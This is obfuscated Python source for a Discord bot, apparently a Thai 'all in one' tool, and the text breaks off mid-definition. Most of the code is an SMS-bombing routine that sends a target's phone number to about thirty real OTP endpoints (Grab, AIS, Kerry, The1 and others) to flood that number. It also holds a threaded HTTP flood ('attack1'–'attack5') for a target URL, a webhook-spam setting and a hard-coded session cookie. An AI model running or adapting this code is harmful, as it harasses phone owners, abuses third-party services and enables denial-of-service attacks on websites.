# ทำไมเป็น DM ผมมาได้ครับ ชื่อ alow_z ID 1181316153478479883
# SCR IN discord.gg/aqt6thEVV7
# Correctly version = V0.8

# CONFIG HELP COMMAND
COMMAND_NSFW = 'nsfw_setup'
COMMAND_SAVROLE = 'saverole_setup'
COMMAND_VERIFY = 'verify_setup'
COMMAND_WEBHOOK = 'webhook_setup'
COMMAND_UPTIME = 'uptime'
COMMAND_REDEEM = 'redeem'
COMMAND_CHECK = 'check_time'
COMMAND_ATTACK = 'attack_setup'
COMMAND_SCRIPT = 'script_setup'

# เซฟยศ config    
name = "alow_z" #ชื่อของแอดมิน | English : ur discord username
log_channel_id = 0 #ช่องเซฟยศ log | English : log save role channel
token = "" #บอทโทเคน | English : bot token 
owner_id = "" # DISCORD ID

# SMS SPAM config
PREFIX = '.' 
LIMIT = 5 # จำนวน 
blacklist = ['191,11,00'] # เบอร์ที่ต้องการจะไม่ให้ยิง

# Verify config
WEBHOOK_URL = "" #ur webhook 
ROLE_ID = 0 #ยศยืนยันตัวตน | English : verify role
BUTTON_NAME = "ยืนยันตัวตน" 

# EMBED IMAGE
Images = ""
COLOR = 0xf1ebeb

# ช่องที่ต้องการให้บอทเขา | English : Join Vc config
Guild_ID = 1067449953376534569  # if vc error go to line 625, and change Guild_ID to your server id, and Vc_ID to vc channel id
Vc_ID = 1067449954014072965

# config แจ้งเตือนออนบอท
channel_id = 1207261945863077899

# Webhook Spam
cooldown = '10' 

# Config Status
Name_status = "พร้อมใช้งาน 💚"
Twitch_url = "https://www.twitch.tv/mastersamaZ"

# Status Config 
STATUS1 = 'พร้อมใช้งาน 💚'
STATUS2 = 'Version 0.8'
STATUS3 = 'ALL IN ONE'
STATUS4 = 'Created by 4levy'
TIME = 2

import nextcord #line:2:import nextcord
import json #line:3:import json
from nextcord .ext import commands #line:4:from nextcord.ext import commands
from nextcord import Interaction ,ButtonStyle ,Embed #line:5:from nextcord import Interaction, ButtonStyle, Embed
from nextcord .ui import View #line:6:from nextcord.ui import View
import asyncio #line:7:import asyncio
import discord #line:8:import discord
import requests #line:9:import requests
from colorama import init ,Fore ,Style #line:10:from colorama import init ,Fore ,Style
blue =Fore .BLUE +Style .BRIGHT #line:11:blue =Fore .BLUE +Style .BRIGHT
from re import search #line:12:from re import search
from requests import post ,Session #line:13:from requests import post, Session
from datetime import datetime ,timedelta #line:14:from datetime import datetime, timedelta
from nextcord import Activity ,ActivityType ,Status #line:15:from nextcord import Activity, ActivityType, Status
import itertools #line:16:import itertools
import datetime as date #line:17:import datetime as date
import os #line:18:import os
from concurrent .futures import ThreadPoolExecutor #line:19:from concurrent.futures import ThreadPoolExecutor
from string import ascii_uppercase ,digits #line:20:from string import ascii_uppercase, digits
from random import choice #line:21:from random import choice
import datetime #line:22:import datetime
from datetime import datetime ,timedelta #line:23:from datetime import datetime, timedelta
import os #line:24:import os
from re import match #line:25:from re import match
import urllib .request #line:26:import urllib.request
from user_agent import generate_user_agent #line:27:from user_agent import generate_user_agent
import aiohttp #line:28:import aiohttp
from nextcord import File #line:29:from nextcord import File
current_time =datetime .now ().strftime ("%Y-%m-%d %H:%M:%S")#line:34:current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
def attack1 (O0OO0OO0000O0OOOO ):#line:36:def attack1(target):
    O0O0O0O0000OOOOO0 =cfscraper .create_scraper ()#line:37:cf = cfscraper.create_scraper()
    O0O0O0O0000OOOOO0 .get (O0OO0OO0000O0OOOO )#line:38:cf.get(target)
    O0O0O0O0000OOOOO0 .post (O0OO0OO0000O0OOOO )#line:39:cf.post(target)
def attack2 (OO0000OOO0O0000O0 ):#line:41:def attack2(target):
    O0000OOO000000O00 =urllib .request .Request (OO0000OOO0O0000O0 ,headers ={'User-Agent':generate_user_agent ()})#line:42:url = urllib.request.Request(target, headers={'User-Agent': generate_user_agent()})
    urllib .request .urlopen (O0000OOO000000O00 )#line:43:urllib.request.urlopen(url)
def attack3 (O0OOO0O0OO000O00O ):#line:45:def attack3(target):
    requests .get (O0OOO0O0OO000O00O )#line:46:requests.get(target)
def attack4 (OOOOOOOOO00O0000O ):#line:48:def attack4(target):
    requests .post (OOOOOOOOO00O0000O )#line:49:requests.post(target)
def attack5 (O0O00O0OO000OOO00 ):#line:51:def attack5(target):
    requests .head (O0O00O0OO000OOO00 )#line:52:requests.head(target)
def run (O00O00OO0OO0O000O ,OOO000OOO0O000OOO ):#line:54:def run(a,b):
    for _OO0O0O00O0O0OOOOO in range (int (OOO000OOO0O000OOO )):#line:55:for _ in range(int(b)):
        threading .Thread (target =attack1 ,args =[O00O00OO0OO0O000O ]).start ()#line:56:threading.Thread(target=attack1, args=[a]).start()
        threading .Thread (target =attack2 ,args =[O00O00OO0OO0O000O ]).start ()#line:57:threading.Thread(target=attack2, args=[a]).start()
        threading .Thread (target =attack3 ,args =[O00O00OO0OO0O000O ]).start ()#line:58:threading.Thread(target=attack3, args=[a]).start()
        threading .Thread (target =attack4 ,args =[O00O00OO0OO0O000O ]).start ()#line:59:threading.Thread(target=attack4, args=[a]).start()
        threading .Thread (target =attack5 ,args =[O00O00OO0OO0O000O ]).start ()#line:60:threading.Thread(target=attack5, args=[a]).start()
def randomString (O000000O00OOO000O ):#line:63:def randomString(N):
    return ''.join (choice (ascii_uppercase +digits )for _O0OO000OOOO000000 in range (O000000O00OOO000O ))#line:64:return ''.join(choice(ascii_uppercase + digits) for _ in range(N))
threading =ThreadPoolExecutor (max_workers =int (100000 ))#line:66:threading = ThreadPoolExecutor(max_workers=int(100000))
useragent ="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"#line:67:useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"
header ={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}#line:68:header = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
intents =nextcord .Intents .default ()#line:70:intents = nextcord.Intents.default()
intents .message_content =True #line:71:intents.message_content = True
bot =commands .Bot (command_prefix =PREFIX ,help_command =None ,intents =intents )#line:72:bot = commands.Bot(command_prefix=PREFIX, help_command=None, intents=intents)
class aclient (commands .Bot ):#line:74:class aclient(commands.Bot):
    def __init__ (O000O000OO0OOOO00 ):#line:75:def __init__(self):
        super ().__init__ (command_prefix =commands .when_mentioned_or (PREFIX ),intents =discord .Intents ().all ())#line:76:super().__init__(command_prefix=commands.when_mentioned_or(PREFIX), intents=discord.Intents().all())
        O000O000OO0OOOO00 .role =None #line:77:self.role = None
message_data ={"embeds":[{"title":"","description":"**สถานะการทํางาน**\n```บอททำงานปกติ 🟢```\n\n**บอทพัฒนาโดย**\n<@1181316153478479883>","color":0xfff9ff ,"image":{"url":""}}]}#line:90:}
url =f"https://discord.com/api/v10/channels/{channel_id}/messages"#line:91:url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
headers ={"Authorization":f"Bot {token}","Content-Type":"application/json"}#line:95:}
response =requests .post (url ,data =json .dumps (message_data ),headers =headers )#line:97:response = requests.post(url, data=json.dumps(message_data), headers=headers)
if response .status_code ==200 :#line:99:if response.status_code == 200:
    print ("Online")#line:100:print("Online")
else :#line:101:else:
    print (f"Error: {response.status_code} - {response.text}")#line:102:print(f"Error: {response.status_code} - {response.text}")
def clear_console ():#line:104:def clear_console():
    os .system ('cls'if os .name =='nt'else 'clear')#line:105:os.system('cls' if os.name == 'nt' else 'clear')
class TerminalColors :#line:107:class TerminalColors:
    HEADER ='\033[95m'#line:108:HEADER = '\033[95m'
    OKBLUE ='\033[94m'#line:109:OKBLUE = '\033[94m'
    OKGREEN ='\033[92m'#line:110:OKGREEN = '\033[92m'
    WARNING ='\033[93m'#line:111:WARNING = '\033[93m'
    FAIL ='\033[91m'#line:112:FAIL = '\033[91m'
    ENDC ='\033[0m'#line:113:ENDC = '\033[0m'
    BOLD ='\033[1m'#line:114:BOLD = '\033[1m'
    UNDERLINE ='\033[4m'#line:115:UNDERLINE = '\033[4m'
def sk1 (O0O0OOO0O00O0O000 ):#line:119:def sk1(phone):
    post ("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers ={"cache-control":"max-age=0",'useragent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',"content-type":"application/x-amz-json-1.1","x-amz-target":"AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent":"aws-amplify/0.1.x js","referer":"https://www.bugaboo.tv/members/resetpass/phone",},json ={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{O0O0OOO0O00O0O000[1:]}"},)#line:130:)
def sk2 (O0O0OO00OO0OOO000 ):#line:132:def sk2(phone):
    post ("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",headers ={"User-Agent":useragent },json ={"on":{"value":O0O0OO00OO0OOO000 ,"country":"66"},"type":"mobile"},)#line:141:)
def sk3 (O0O0O000000OOOOO0 ):#line:143:def sk3(phone):
    post ("https://www.theconcert.com/rest/request-otp",headers ={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36","cookie":"lang=th;_pbjs_userid_consent_data=3524755945110770;_gcl_au=1.1.1464936573.1671204510;_gid=GA1.2.521817435.1671204510;_gat_UA-133219660-2=1;_fbp=fb.1.1671204510552.293496193;__gads=ID=4f53f92d90f14e3b-22b5f219eed800b9:T=1671204514:RT=1671204514:S=ALNI_MbhYBo5Conm5a9KPhLCLQzdoYslHw;__gpi=UID=00000b91f73b5ed1:T=1671204514:RT=1671204514:S=ALNI_MYo815ZzoPUThss61W0NSqU6Zx5kA;_ga=GA1.1.1714484015.1671204510;_ga_N9T2LF0PJ1=GS1.1.1671204510.1.1.1671204541.0.0.0;adonis-session=cb673f508955dcf6b8246de604839e44rBlxF5AbxNaY%2B8Cq72gSdtAR%2BtBgHyhMtillRc9eBJ5ZOQH6DjXlSJpZQejUO6IenLA1umsiGtankI2cnDxhKQOfrbBDQpu7jQecLv4AjkXB6cfh%2F5zyOhxaljNTGKSw;XSRF-TOKEN=0e82a4759c6fe992966458d638fa3fcaUbV8tu%2FauRE6uMQT3BVHSXuwYyehcery96YZaR3xCEO4DKS5sYAniQlcXHir1XjPUrVkv%2FzK1QAnwR%2FDBw9ubQniyugHdRhBE6JYZLDd8xBz%2FYVyyQ112nb62JjfY6aV"},json ={"mobile":f"{O0O0O000000OOOOO0}","country_code":"TH","lang":"th","channel":"sms","digit":4 })#line:144:post("https://www.theconcert.com/rest/request-otp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36","cookie": "lang=th;_pbjs_userid_consent_data=3524755945110770;_gcl_au=1.1.1464936573.1671204510;_gid=GA1.2.521817435.1671204510;_gat_UA-133219660-2=1;_fbp=fb.1.1671204510552.293496193;__gads=ID=4f53f92d90f14e3b-22b5f219eed800b9:T=1671204514:RT=1671204514:S=ALNI_MbhYBo5Conm5a9KPhLCLQzdoYslHw;__gpi=UID=00000b91f73b5ed1:T=1671204514:RT=1671204514:S=ALNI_MYo815ZzoPUThss61W0NSqU6Zx5kA;_ga=GA1.1.1714484015.1671204510;_ga_N9T2LF0PJ1=GS1.1.1671204510.1.1.1671204541.0.0.0;adonis-session=cb673f508955dcf6b8246de604839e44rBlxF5AbxNaY%2B8Cq72gSdtAR%2BtBgHyhMtillRc9eBJ5ZOQH6DjXlSJpZQejUO6IenLA1umsiGtankI2cnDxhKQOfrbBDQpu7jQecLv4AjkXB6cfh%2F5zyOhxaljNTGKSw;XSRF-TOKEN=0e82a4759c6fe992966458d638fa3fcaUbV8tu%2FauRE6uMQT3BVHSXuwYyehcery96YZaR3xCEO4DKS5sYAniQlcXHir1XjPUrVkv%2FzK1QAnwR%2FDBw9ubQniyugHdRhBE6JYZLDd8xBz%2FYVyyQ112nb62JjfY6aV"},json={"mobile":f"{phone}","country_code":"TH","lang":"th","channel":"sms","digit":4})
def sk4 (OO0OOO0000000OOOO ):#line:147:def sk4(phone):
    post ("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",headers ={"User-Agent":"Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"},data ={"mobile_phone_no":OO0OOO0000000OOOO })#line:148:post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"}, data={"mobile_phone_no":phone})
def sk5 (O0OOOOO0OO0O0OO00 ):#line:150:def sk5(phone):
    post ("https://api2.1112.com/api/v1/otp/create",json ={"phonenumber":f"{O0OOOOO0OO0O0OO00}","language":"th"},headers ={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"},)#line:157:)
def ab1 (O0O0O000O000O00OO ):#line:159:def ab1(phone):
    post ("https://api.myfave.com/api/fave/v3/auth",headers ={"client_id":"dd7a668f74f1479aad9a653412248b62","User-Agent":useragent },json ={"phone":f"{O0O0O000O000O00OO}"})#line:160:post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"{phone}"})
def ab2 (OOO0O00O0O0OO0OOO ):#line:162:def ab2(phone):
    post ("https://u.icq.net/api/v65/rapi/auth/sendCode",headers ={"User-Agent":useragent },json ={"reqId":"39816-1633012470","params":{"phone":f"{OOO0O00O0O0OO0OOO[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})#line:163:post("https://u.icq.net/api/v65/rapi/auth/sendCode", headers={"User-Agent": useragent}, json={"reqId":"39816-1633012470","params":{"phone": f"{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
def ab3 (OOO0000O00O0O0OOO ):#line:165:def ab3(phone):
    post ("https://www.fox888.com/api/otp/register",data =f"applicant={OOO0000O00O0O0OOO}&serviceName=FOX888",headers ={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36","content-type":"application/x-www-form-urlencoded; charset=UTF-8","Accept":"*/*","X-Requested-With":"XMLHttpRequest"})#line:166:post("https://www.fox888.com/api/otp/register", data = f"applicant={phone}&serviceName=FOX888", headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest"})
def ab4 (O000O00O0OOOO0OO0 ):#line:168:def ab4(phone):
    post ("https://ecomapi.eveandboy.com/v10/user/signup/phone",headers ={"User-Agent":useragent },data ={"phone":O000O00O0OOOO0OO0 ,"password":"123456789Az"})#line:169:post("https://ecomapi.eveandboy.com/v10/user/signup/phone", headers={"User-Agent": useragent}, data={"phone": phone,"password":"123456789Az"})
def ab5 (O00OO00OOOO0OO0O0 ):#line:171:def ab5(phone):
    post ("https://api.1112delivery.com/api/v1/otp/create",headers ={"User-Agent":useragent },data ={'phonenumber':O00OO00OOOO0OO0O0 ,'language':"th"})#line:172:post("https://api.1112delivery.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})
def ab6 (OOOOOOOOO00OOO0OO ):#line:174:def ab6(phone):
    post ("https://gccircularlivingshop.com/sms/sendOtp",headers ={"User-Agent":useragent },json ={"grant_type":"otp","username":f"{OOOOOOOOO00OOO0OO[1:]}","password":"","client":"ecommerce"})#line:175:post("https://gccircularlivingshop.com/sms/sendOtp", headers={"User-Agent": useragent}, json={"grant_type":"otp","username": f"{phone[1:]}","password":"","client":"ecommerce"})
def ab7 (OOOOO0O0000O0OO0O ):#line:177:def ab7(phone):
    post ("https://shop.foodland.co.th/login/generation",headers ={"User-Agent":useragent },data ={"phone":OOOOO0O0000O0OO0O })#line:178:post("https://shop.foodland.co.th/login/generation", headers={"User-Agent": useragent}, data={"phone": phone})
def ab8 (OOO0O00OO0OO00O0O ):#line:180:def ab8(phone):
    post ("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code",headers ={"User-Agent":useragent },data ={"number":f"{OOO0O00OO0OO00O0O[1:]}"})#line:181:post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code", headers={"User-Agent": useragent}, data={"number": f"{phone[1:]}"})
def ab9 (O0OOO0O000OOO00OO ):#line:183:def ab9(phone):
    post ("https://api.sacasino9x.com/api/RegisterService/RequestOTP",headers ={"User-Agent":useragent },json ={"Phone":O0OOO0O000OOO00OO })#line:184:post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", headers={"User-Agent": useragent}, json={"Phone": phone})
def ab10 (OOOOOOOOOO00O00OO ):#line:186:def ab10(phone):
    post ("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp",headers ={"User-Agent":useragent },data ={"phone":OOOOOOOOOO00O00OO })#line:187:post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": useragent}, data={"phone": phone})
def ab11 (OO0O0O00O00O0O00O ):#line:189:def ab11(phone):
    post ("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code",headers ={"User-Agent":useragent },data ={"phone":OO0O0O00O00O0O00O })#line:190:post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})
def ab12 (OO00OOO0OO0000OOO ):#line:192:def ab12(phone):
    post ("https://partner-api.grab.com/grabid/v1/oauth2/otp",headers ={"User-Agent":useragent },json ={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number":f"{OO00OOO0OO0000OOO[1:]}"})#line:193:post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"{phone[1:]}"})
def ab13 (OO0O0O0OOOO0000O0 ):#line:195:def ab13(phone):
    post ("https://api.scg-id.com/api/otp/send_otp",headers ={"User-Agent":useragent ,"Content-Type":"application/json;charset=UTF-8"},json ={"phone_no":OO0O0O0OOOO0000O0 })#line:196:post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
def ab14 (OOO00OOOO00OOO000 ):#line:198:def ab14(phone):
    O0OO0O0000O0O0O00 =Session ()#line:199:session = Session()
    O0O0OOO0O0O000OOO =O0OO0O0000O0O0O00 .get ("https://www.shopat24.com/register/").text #line:200:searchItem = session.get("https://www.shopat24.com/register/").text
    OO0OOO0O0O000O000 =search ("""<input type="hidden" name="_csrf" value="(.*)" />""",O0O0OOO0O0O000OOO ).group (1 )#line:201:ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""", searchItem).group(1)
    O0OO0O0000O0O0O00 .post ("https://www.shopat24.com/register/ajax/requestotp/",headers ={"User-Agent":useragent ,"content-type":"application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN":OO0OOO0O0O000O000 },data ={"phoneNumber":OOO00OOOO00OOO000 })#line:202:session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"User-Agent": useragent, "content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": ReqTOKEN}, data={"phoneNumber": phone})
def ab15 (O0OOO0000OO0O00O0 ):#line:204:def ab15(phone):
    post ("https://prettygaming168-api.auto888.cloud/api/v3/otp/send",headers ={"User-Agent":useragent },data ={"tel":O0OOO0000OO0O00O0 ,"otp_type":"register"})#line:205:post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", headers={"User-Agent": useragent}, data={"tel": phone,"otp_type":"register"})
def ab16 (O00O0OO0000OO0OOO ):#line:207:def ab16(phone):
    post ("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",headers ={"User-Agent":useragent },json ={"on":{"value":O00O0OO0000OO0OOO ,"country":"66"},"type":"mobile"})#line:208:post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", headers={"User-Agent": useragent}, json={"on":{"value": phone,"country":"66"},"type":"mobile"})
def ab17 (O000OOOO0OOOOOOOO ):#line:210:def ab17(phone):
    post (f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{O000OOOO0OOOOOOOO}",headers ={"User-Agent":useragent })#line:211:post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})
def ab18 (O0OO0O000O00OO0OO ):#line:213:def ab18(phone):
    post ("https://graph.firster.com/graphql",headers ={"User-Agent":useragent ,"organizationcode":"lifestyle","content-type":"application/json"},json ={"operationName":"sendOtp","variables":{"input":{"mobileNumber":O0OO0O000O00OO0OO [1 :],"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"})#line:214:post("https://graph.firster.com/graphql",headers={"User-Agent": useragent, "organizationcode": "lifestyle","content-type": "application/json"}, json={"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone[1:],"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"})
def ab19 (OO00O0OOOOO0OOOO0 ):#line:216:def ab19(phone):
    post ("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661",headers ={"User-Agent":useragent },json ={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone":f"{OO00O0OOOOO0OOOO0[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName":randomString (10 )}})#line:217:post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": randomString(10)}})
def ab20 (O0OOOO00OOO00O000 ):#line:219:def ab20(phone):
    post ("https://store.boots.co.th/api/v1/guest/register/otp",headers ={"User-Agent":useragent },json ={"phone_number":f"{O0OOOO00OOO00O000[1:]}"})#line:220:post("https://store.boots.co.th/api/v1/guest/register/otp", headers={"User-Agent": useragent}, json={"phone_number":f"{phone[1:]}"})
def ab21 (OO000OOOOOOO000O0 ):#line:222:def ab21(phone):
    post ("https://m.lucabet168.com/api/register-otp",headers ={"User-Agent":useragent },json ={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel":OO000OOOOOOO000O0 })#line:223:post("https://m.lucabet168.com/api/register-otp", headers={"User-Agent": useragent} ,json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
def ab22 (OO00OOOOO00000O0O ):#line:225:def ab22(phone):
    O00O0OO000OO0OOO0 =Session ()#line:226:session = Session()
    OOO0O0O00O0O0O0O0 =O00O0OO000OO0OOO0 .get ("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",headers ={"User-Agent":useragent }).text #line:227:ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": useragent}).text
    O00O0OO000OO0OOO0 .post ("https://srfng.ais.co.th/api/v2/login/sendOneTimePW",data =f"msisdn={OO00OOOOO00000O0O[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers ={"User-Agent":useragent ,"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","authorization":f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", OOO0O0O00O0O0O0O0).group(1)}'''})#line:228:session.post("https://srfng.ais.co.th/api/v2/login/sendOneTimePW", data=f"msisdn={phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
def ab23 (O0O000OO000OO00O0 ):#line:230:def ab23(phone):
    post (url ="https://www.cpffeedonline.com/Customer/RegisterRequestOTP",data ={"mobileNumber":f"{O0O000OO000OO00O0}"})#line:231:post(url="https://www.cpffeedonline.com/Customer/RegisterRequestOTP", data={"mobileNumber":f"{phone}"})
def ab24 (OO00O0000O0O0OOO0 ):#line:233:def ab24(phone):
    OOOOOO0OOO000O0OO =Session ()#line:234:session = Session()
    O0O0OOO00O0O00000 =OOOOOO0OOO000O0OO .get ("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",headers ={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}).text #line:235:ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}).text
    OOOOOO0OOO000O0OO .post ("https://srfng.ais.co.th/login/sendOneTimePW",data =f"msisdn=66{OO00O0000O0O0OOO0[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers ={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","authorization":f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", O0O0OOO00O0O00000).group(1)}'''})#line:236:session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
def ab25 (OOO0OOO0OO0O0OO00 ):#line:238:def ab25(phone):
    post ("https://api2.1112.com/api/v1/otp/create",json ={"phonenumber":f"{OOO0OOO0OO0O0OO00}","language":"th"},headers ={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})#line:239:post("https://api2.1112.com/api/v1/otp/create", json={"phonenumber":f"{phone}","language":"th"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})
def ab26 (O0OO00OO00OO0O000 ):#line:241:def ab26(phone):
    post ("https://unacademy.com/api/v3/user/user_check/",json ={"phone":f"{O0OO00OO00OO0O000}","country_code":"TH"},headers ={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})#line:242:post("https://unacademy.com/api/v3/user/user_check/", json={"phone":f"{phone}","country_code":"TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})
def ab27 (O0OOO0O0O00OOOOOO ):#line:244:def ab27(phone):
